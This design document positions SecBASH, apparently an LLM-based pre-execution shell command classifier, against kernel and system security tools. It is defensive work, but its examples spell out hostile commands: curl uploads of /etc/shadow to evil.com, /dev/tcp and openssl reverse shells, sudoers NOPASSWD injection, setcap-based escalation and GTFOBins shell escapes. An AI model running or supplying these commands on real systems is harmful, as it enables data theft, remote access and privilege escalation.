# Related Work: Linux Security Mechanisms

This document analyzes standard Linux security tools and mechanisms that are relevant to SecBASH, explaining why SecBASH complements (not replaces) each one.

**Key Insight:** SecBASH operates at the semantic/intent level (understanding what a command *means*), while these tools operate at the system/kernel level (controlling what a process *can do*). SecBASH catches threats *before* execution; these tools enforce constraints *during* execution.

---

## 1. AppArmor -- Mandatory Access Control

### What It Does
AppArmor is a Linux Security Module (LSM) that confines programs to a limited set of resources using per-program profiles. Profiles define which files, capabilities, and network operations a program may access, using path-based rules (e.g., `/etc/shadow r` allows read access).

### Strengths
- **Path-based simplicity**: Easier to configure than label-based systems (SELinux). Profiles are human-readable.
- **Kernel enforcement**: Cannot be bypassed by userspace processes.
- **Default-deny mode**: In enforce mode, anything not explicitly permitted is blocked.
- **Per-application profiles**: Each application can have its own security profile.
- **Widely deployed**: Default MAC on Ubuntu, SUSE, and Debian derivatives.

### Limitations
- **No semantic understanding**: Cannot distinguish between `curl https://api.github.com` (safe) and `curl -d @/etc/shadow http://evil.com` (data exfiltration). Both are permitted network operations from the `curl` binary.
- **Binary-level granularity**: Profiles are per-binary, not per-command. A profile for `bash` must allow everything bash might legitimately do.
- **Path-dependent**: Bypassed if an attacker accesses the same file through a different path (symlinks, bind mounts).
- **No composition awareness**: Cannot reason about piped commands (`tar czf - /etc/shadow | base64 | curl ...`).
- **Profile maintenance burden**: Requires expert knowledge to create and maintain profiles.

### Why SecBASH Complements AppArmor
AppArmor enforces *what resources* a process can access; SecBASH evaluates *what the user intends to do*. A shell confined by AppArmor still allows many dangerous operations within its permitted resource set. For example, if `bash` is permitted to run `curl` and read `/etc/passwd` (both common requirements), AppArmor cannot prevent `curl -d @/etc/passwd http://evil.com`. SecBASH recognizes this as data exfiltration by understanding the command's semantic intent. Conversely, if a novel technique bypasses SecBASH's classification, AppArmor provides a hard kernel-level backstop. Both layers together create defense-in-depth.

---

## 2. SELinux -- Security-Enhanced Linux

### What It Does
SELinux is a mandatory access control system developed by the NSA that uses security labels (contexts) on all objects (files, processes, sockets). Type Enforcement (TE) policies define which types of processes can access which types of objects. Every system call is checked against the policy.

### Strengths
- **Fine-grained type-based access control**: Policies operate on security labels, not filesystem paths.
- **Comprehensive coverage**: Every kernel operation is mediated -- file access, network connections, IPC, device access.
- **Proven at scale**: Required for RHEL, CentOS, Fedora; used in Android (SEAndroid).
- **Multi-Level Security (MLS)**: Supports Bell-LaPadula confidentiality model for classified environments.
- **Non-bypassable**: Enforced within the kernel; root processes are still constrained.

### Limitations
- **No intent understanding**: Like AppArmor, SELinux cannot distinguish between legitimate and malicious uses of the same system call. `write()` to `/etc/sudoers` is the same system call whether writing a legitimate entry or `user ALL=(ALL) NOPASSWD: ALL`.
- **Extreme complexity**: 100,000+ rules in the reference policy. Even experienced administrators struggle with policy development.
- **Often disabled**: Complexity leads many administrators to set `SELINUX=permissive` or `disabled`, eliminating protection entirely.
- **No command-level reasoning**: Operates on system calls and labels, not on command strings or shell semantics.

### Why SecBASH Complements SELinux
SELinux provides the strongest kernel-level access control available on Linux, but its policies are structural, not semantic. `echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers` is a `write()` system call that SELinux only blocks if the process's type lacks write access to the `etc_t` type. If the process has such access (common for admin shells), SELinux permits it. SecBASH recognizes this as privilege escalation regardless of the process's SELinux type. SecBASH catches intent; SELinux enforces access -- complementary concerns at different abstraction levels.

---

## 3. seccomp / seccomp-bpf -- System Call Filtering

### What It Does
seccomp (secure computing mode) restricts the system calls a process can make. seccomp-bpf extends this with BPF (Berkeley Packet Filter) programs that can inspect system call arguments. Used extensively by container runtimes, Chrome/Chromium, and systemd services.

### Strengths
- **System call granularity**: Can allow/deny individual system calls (e.g., block `execve`, `fork`, `socket`).
- **Argument inspection**: BPF programs can check system call arguments (e.g., allow `socket(AF_UNIX, ...)` but deny `socket(AF_INET, ...)`).
- **Minimal overhead**: BPF programs execute in-kernel with negligible performance impact.
- **Defense against unknown vulnerabilities**: Blocking unnecessary system calls reduces the kernel attack surface.

### Limitations
- **No semantic understanding**: `execve("/usr/bin/curl", ["curl", "https://api.github.com"])` and `execve("/usr/bin/curl", ["curl", "-d", "@/etc/shadow", "http://evil.com"])` are the same system call (`execve`). seccomp cannot distinguish them.
- **Application compatibility**: Overly restrictive filters break applications. Determining the minimum required syscall set is difficult.
- **Static policy**: Filters are set at process creation and cannot adapt to context.
- **No command composition**: Cannot reason about pipelines or shell constructs.

### Why SecBASH Complements seccomp
seccomp operates at the lowest level -- individual system calls. It is excellent at removing kernel attack surface (blocking `ptrace`, `mount`, `kexec_load`) but cannot reason about the semantics of permitted system calls. Blocking `execve` prevents all command execution; allowing it permits all commands equally. SecBASH fills this gap by evaluating the semantic content of what will be executed before it becomes a system call. Together: SecBASH blocks dangerous commands; seccomp limits what escapes SecBASH to a restricted syscall set.

---

## 4. Linux Namespaces / cgroups -- Container Isolation

### What It Does
Linux namespaces provide isolation of system resources: PID (process IDs), NET (network stack), MNT (mount points), UTS (hostname), IPC (inter-process communication), USER (user/group IDs), and CGROUP. cgroups limit resource usage (CPU, memory, I/O, network bandwidth). Together, they form the foundation of container technologies (Docker, Podman, LXC).

### Strengths
- **Strong isolation**: Each namespace provides an independent view of system resources.
- **Resource limits**: cgroups prevent fork bombs, memory exhaustion, and CPU starvation.
- **Network isolation**: Network namespaces can completely isolate network access.
- **Layered filesystems**: Mount namespaces with overlayfs provide copy-on-write isolation.

### Limitations
- **No intent analysis**: Within a namespace, all commands are equally permitted. A network namespace either allows network access or doesn't -- it cannot distinguish legitimate from malicious traffic.
- **Configuration complexity**: Proper namespace setup requires expertise. Misconfigurations (e.g., sharing the host PID namespace) undermine isolation.
- **Escape vulnerabilities**: Container escapes (CVE-2019-5736, CVE-2024-21626) allow processes to break out of namespace boundaries.
- **Kernel attack surface**: Namespaces add kernel complexity, creating potential vulnerability classes.

### Why SecBASH Complements Namespaces/Containers
Within a container, users still execute shell commands. A container with network access still permits `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`. A container with mounted data volumes still permits `cat /app/secrets.yml | base64 | curl -d @- http://evil.com`. SecBASH evaluates every command within the container, catching malicious intent regardless of the isolation boundaries. Conversely, namespaces contain the blast radius if SecBASH's classifier is bypassed.

---

## 5. chroot -- Filesystem Isolation

### What It Does
`chroot` changes the apparent root directory for a process and its children. Processes inside a chroot jail cannot access files outside the new root (in theory).

### Strengths
- **Simple concept**: Easy to understand and implement for basic isolation.
- **No kernel patches required**: Available on all Unix systems since the 1980s.
- **Quick deployment**: Single system call changes the filesystem root.

### Limitations
- **Well-known escape techniques**: Root processes can escape via `chroot(".")` + `chdir("..")`, creating device nodes, or using `pivot_root`. Not a security boundary.
- **No process/network/IPC isolation**: Only restricts filesystem view. Processes can still access network, kill other processes, use shared memory.
- **No semantic analysis**: Within the chroot, any command is permitted.
- **Requires root to set up**: The `chroot()` system call requires `CAP_SYS_CHROOT`.

### Why SecBASH Complements chroot
chroot provides minimal filesystem isolation. SecBASH evaluates commands within any environment, including chroot jails. Commands like `mknod /dev/sda b 8 0` (creating a block device to access the host disk) are chroot escape techniques that SecBASH can recognize and block semantically, while chroot itself has no mechanism to prevent them if the process has sufficient privileges.

---

## 6. rbash (Restricted Bash)

### What It Does
rbash disables certain bash features: changing directories with `cd`, modifying PATH/SHELL/ENV, using commands with `/` in the name, redirecting output with `>` or `>>`, importing function definitions.

### Strengths
- **Built-in to bash**: No additional software needed.
- **Syntactic restrictions**: Prevents the most obvious path manipulation and redirect-based attacks.
- **Simple to enable**: `ln -s /bin/bash /bin/rbash` or `chsh -s /bin/rbash user`.

### Limitations
- **Trivially bypassed**: Well-documented escapes via `vim :!bash`, `less !bash`, `awk 'BEGIN {system("/bin/sh")}'`, `python -c 'import os; os.system("/bin/sh")'`, `find / -exec /bin/sh \;`, `man man !/bin/sh`.
- **Static rules only**: Cannot adapt to new bypass techniques.
- **No intent understanding**: Blocks syntax patterns, not semantic intent.
- **Startup file window**: `.bashrc` and `.bash_profile` are processed before restrictions take effect.

### Why SecBASH Complements rbash
rbash blocks structural patterns (no `cd`, no `/` in commands); SecBASH understands semantic intent. Every GTFOBins shell escape bypasses rbash but is caught by SecBASH. `vim -c ':!bash'` is syntactically a `vim` invocation (permitted by rbash) but semantically a shell escape (blocked by SecBASH). Together: rbash provides a deterministic baseline; SecBASH catches the semantic escapes that rbash's simplistic rules cannot.

---

## 7. sudo / sudoers -- Privilege Management

### What It Does
`sudo` allows permitted users to execute commands as another user (typically root). The `/etc/sudoers` file specifies who may run what commands, with or without password authentication.

### Strengths
- **Granular privilege delegation**: Restricts root access to specific commands.
- **Audit trail**: Every invocation logged with user, command, timestamp.
- **Ubiquitous**: Standard privilege elevation mechanism on all Linux systems.
- **Command argument restrictions**: Rules can specify exact arguments.

### Limitations
- **No intent analysis**: Verifies whether a user is *permitted*, not whether a command is *safe*. `sudo rm -rf /` is permitted with `ALL` access.
- **Wildcard dangers**: `alice ALL=(ALL) /usr/bin/find *` permits `sudo find / -exec /bin/bash \;`.
- **GTFOBins exploitation**: Hundreds of commonly sudoed commands can be exploited for privilege escalation. `sudo vi` allows `:!/bin/bash`.
- **Complex configuration pitfalls**: `sudo /usr/bin/less /var/log/*` allows `sudo /usr/bin/less /var/log/../../etc/shadow`.

### Why SecBASH Complements sudo
sudo asks "Is this user permitted?" SecBASH asks "Is this command's intent safe?" The complement is clearest for GTFOBins attacks. `sudo vi -c ':!/bin/bash'` seems like running an allowed editor; SecBASH recognizes the `-c ':!/bin/bash'` as a shell escape. `sudo find / -exec /bin/bash \;` is a classic escalation -- sudo checks that `find` is permitted; SecBASH understands that `find -exec /bin/bash` executes a shell. Both are necessary.

---

## 8. auditd -- Linux Audit Framework

### What It Does
`auditd` provides comprehensive system call auditing and event logging. It is primarily a **detection and forensics** mechanism, not prevention. Kernel-level hooks generate events based on configurable rules, logged to `/var/log/audit/audit.log`.

### Strengths
- **Comprehensive visibility**: Can log every system call, file access, and privilege change.
- **Non-bypassable by user processes**: Operates in kernel space.
- **Regulatory compliance**: Required for PCI-DSS, HIPAA, SOX, FedRAMP.
- **Structured log format**: PID, UID, timestamp, system call, arguments, result.

### Limitations
- **Detection, not prevention**: Logs events but does not block them. Tells you what happened *after the fact*.
- **No semantic understanding**: Logs raw system call parameters without understanding command intent.
- **Volume and noise**: Audit logs on busy systems are enormous; filtering is challenging.
- **Post-compromise limitation**: Root attacker can disable auditd or clear logs.

### Why SecBASH Complements auditd
SecBASH is **preventive**; auditd is **detective**. SecBASH reduces noise by blocking recognized threats before they generate events. auditd provides visibility into what happens after SecBASH permits a command. If SecBASH misclassifies, auditd's logs provide the forensic trail. auditd also detects threats bypassing SecBASH entirely (background processes, cron jobs). Together: prevent-detect-respond pipeline.

---

## 9. Firejail / Bubblewrap -- Application Sandboxing

### What It Does
**Firejail** is a SUID security sandbox combining namespaces, seccomp-bpf, capability dropping, and filesystem restrictions. Pre-built profiles for hundreds of applications.

**Bubblewrap (bwrap)** is a lightweight, unprivileged sandboxing tool using Linux user namespaces. Originally developed for Flatpak. Deliberately small codebase (~few thousand lines of C) for auditability. No SUID required.

### Strengths
- **Comprehensive sandboxing**: Combines multiple isolation mechanisms.
- **Ease of use**: `firejail firefox` sandboxes with one command.
- **Minimal attack surface (bwrap)**: No SUID, tiny codebase.
- **Foundation of Flatpak**: bwrap sandboxes all Flatpak applications.

### Limitations
- **No semantic command analysis**: Sandboxes the *application*, not the *intent*.
- **SUID attack surface (Firejail)**: Being SUID root; vulnerabilities grant root (CVE-2022-31214).
- **Not designed for shell sessions**: Designed for individual applications, not arbitrary command evaluation.
- **Bypass through allowed capabilities**: Permitted operations can be exploited regardless of intent.

### Why SecBASH Complements Firejail/bwrap
`firejail --net=none bash` prevents network-based reverse shells but not `rm -rf /`, `cat /etc/shadow`, or fork bombs within the sandbox. SecBASH recognizes and blocks all of these by semantic intent. Conversely, if a novel technique passes SecBASH, Firejail's network namespace still blocks outgoing connections. The combination provides both intent-level and resource-level protection.

---

## 10. iptables / nftables -- Network Filtering

### What It Does
Linux kernel packet filtering framework. Inspects network packets and applies rules to ACCEPT, DROP, REJECT, or LOG them based on source/destination IPs, ports, protocol, and connection state.

### Strengths
- **Packet-level control**: Inspects and controls every network packet.
- **Stateful filtering**: Connection tracking enables rules based on connection state.
- **Essential for reverse shell prevention**: Egress filtering can prevent many reverse shell techniques.
- **Mature and well-understood**: Standard Linux firewall since 2001.

### Limitations
- **No content inspection**: Inspects packet headers (IPs, ports, protocol), not content. Cannot distinguish legitimate HTTPS from exfiltration over HTTPS.
- **No command intent awareness**: `curl https://api.github.com` and `curl -d @/etc/shadow http://evil.com/exfil` produce identical TCP SYN packets at the header level.
- **Egress filtering rarely deployed**: Most systems allow unrestricted outbound connections. Ports 80/443 are typically permitted.
- **DNS tunneling bypass**: Data exfiltration through DNS queries is almost always permitted.

### Why SecBASH Complements iptables/nftables
This is one of the most important complementary relationships. `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` on a blocked port fails due to iptables. But `openssl s_client -quiet -connect 10.0.0.1:443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8443` uses port 443 -- almost always permitted. iptables cannot distinguish this from legitimate HTTPS. SecBASH recognizes piping shell I/O through encrypted connections as a reverse shell regardless of port. Conversely, iptables provides network-level enforcement if SecBASH misses a novel technique. Two independent barriers.

---

## 11. Linux Capabilities -- Fine-Grained Privilege Control

### What It Does
Decomposes root privilege into ~40 distinct capabilities (e.g., `CAP_NET_BIND_SERVICE` for binding low ports, `CAP_SYS_ADMIN` for broad admin operations, `CAP_SETUID` for changing UID).

### Strengths
- **Least privilege support**: Programs operate with only needed capabilities.
- **Kernel-enforced**: Cannot be bypassed by userspace programs.
- **File-based assignment**: `setcap` allows per-binary capability assignment without SUID.

### Limitations
- **No semantic understanding**: `CAP_NET_RAW` allows both legitimate `ping` and malicious ARP spoofing.
- **CAP_SYS_ADMIN is too broad**: Effectively near-root.
- **Capability abuse**: `setcap cap_setuid+ep /usr/bin/python3` grants Python UID-changing ability -- a classic escalation.

### Why SecBASH Complements Linux Capabilities
`setcap cap_setuid+ep /usr/bin/python3` grants Python the ability to become root. The kernel sees a legitimate `setxattr()` by a process with `CAP_SETFCAP` and permits it. SecBASH recognizes granting `cap_setuid` to an interpreter as an escalation technique and blocks it. SecBASH prevents intentional misuse of capabilities; capabilities prevent unintended exercise of privilege.

---

## 12. grsecurity / PaX -- Kernel Hardening

### What It Does
grsecurity patches the Linux kernel for hardening: enhanced ASLR, W^X enforcement (PaX MPROTECT), control flow integrity (RAP), chroot hardening, kernel self-protection, trusted path execution, and socket restrictions. Commercial-only since 2017.

### Strengths
- **Deep exploit mitigation**: Addresses memory corruption at a fundamental level.
- **Defense against zero-days**: Makes exploitation techniques unreliable.
- **Kernel self-protection**: Reduces the kernel's own attack surface.

### Limitations
- **Commercial availability only**: Limited adoption since 2017.
- **No semantic analysis**: Operates entirely at the kernel level.
- **Compatibility issues**: Strict PaX MPROTECT can break JIT-dependent applications.

### Why SecBASH Complements grsecurity/PaX
grsecurity operates at the lowest level -- kernel memory layout, control flow integrity, hardware-level exploit mitigation. SecBASH operates at the highest level -- understanding human-readable command strings. grsecurity cannot prevent `echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers` because this is a perfectly normal `write()` system call. SecBASH recognizes it as privilege escalation. Conversely, if a sophisticated attacker bypasses SecBASH and attempts a memory corruption exploit, grsecurity makes exploitation unreliable.

---

## Summary: The Defense-in-Depth Stack

```
+----------------------------------------------------------+
|  Layer 6: SEMANTIC / INTENT (SecBASH)                     |
|  "What does this command MEAN? Is the intent malicious?"  |
|  Pre-execution, LLM-based classification                  |
+----------------------------------------------------------+
|  Layer 5: AUTHENTICATION / AUTHORIZATION (sudo, PAM)     |
|  "Is this user allowed to run this?"                      |
+----------------------------------------------------------+
|  Layer 4: SHELL RESTRICTIONS (rbash)                      |
|  "Is this shell syntax permitted?"                        |
+----------------------------------------------------------+
|  Layer 3: SANDBOX / ISOLATION (Firejail, bwrap, chroot)  |
|  "What resources can this process see?"                   |
+----------------------------------------------------------+
|  Layer 2: MAC / ACCESS CONTROL (AppArmor, SELinux, caps) |
|  "What operations may this process perform?"              |
+----------------------------------------------------------+
|  Layer 1: SYSCALL / KERNEL (seccomp, grsec, namespaces)  |
|  "What kernel interfaces can this process use?"           |
+----------------------------------------------------------+
|  Layer 0: NETWORK (iptables/nftables)                     |
|  "What packets may enter or leave?"                       |
+----------------------------------------------------------+
|  DETECTION / FORENSICS (auditd)                           |
|  "What happened?" (cross-cutting concern)                 |
+----------------------------------------------------------+
```

### The Core Argument

Every existing Linux security mechanism operates on **mechanisms** (system calls, file paths, labels, packets) rather than **intent**. This means:

1. **Same mechanism, different intent**: The system calls for `curl https://api.github.com` and `curl -d @/etc/shadow http://evil.com` are identical. No kernel mechanism can distinguish them.

2. **Intent expressed through composition**: `tar czf - /etc/shadow | base64 | curl -d @- http://evil.com/exfil` composes three individually benign operations into malicious exfiltration.

3. **Obfuscation defeats pattern matching**: Reverse shells can be built in dozens of languages using standard libraries. LLM-based semantic analysis recognizes the underlying intent.

**Without SecBASH**: An attacker whose command passes syntactic, authentication, path, label, and syscall checks can still execute semantically malicious commands using only permitted operations.

**Without kernel mechanisms**: SecBASH's classifier might be bypassed by sufficiently obfuscated commands. Without kernel enforcement, a missed classification results in unrestricted execution.

**With both**: Threats must bypass both semantic analysis AND runtime enforcement -- fundamentally different analysis approaches making simultaneous bypass extremely difficult.
